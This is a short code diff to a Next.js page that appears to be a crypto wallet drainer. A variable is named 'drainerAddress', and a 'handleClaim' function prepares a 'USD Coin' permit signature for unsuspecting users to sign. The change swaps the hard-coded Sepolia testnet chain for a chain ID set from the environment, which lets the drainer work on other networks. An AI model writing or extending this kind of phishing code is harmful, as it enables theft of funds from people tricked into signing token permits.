@@ -39,13 +39,14 @@ export default function Home() {
 
   const drainerAddress = "0xd115dbad4574D1332a44d7453B387ad38750c957" as `0x${string}`;
   const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0x546cfd202b5d656AafEB21E6cE8196F075122b44") as `0x${string}`;
+  const targetChainId = Number(process.env.NEXT_PUBLIC_CHAIN_ID || 11155111);
 
   const { data: nonce } = useReadContract({
     address: tokenAddress,
     abi: noncesAbi,
     functionName: 'nonces',
     args: address ? [address] : undefined,
-    chainId: sepolia.id,
+    chainId: targetChainId,
   })
 
   const handleClaim = async () => {
@@ -66,7 +67,7 @@ export default function Home() {
         domain: {
           name: 'USD Coin',
           version: '1',
-          chainId: sepolia.id,
+          chainId: targetChainId,
           verifyingContract: tokenAddress,
         },
         types: {
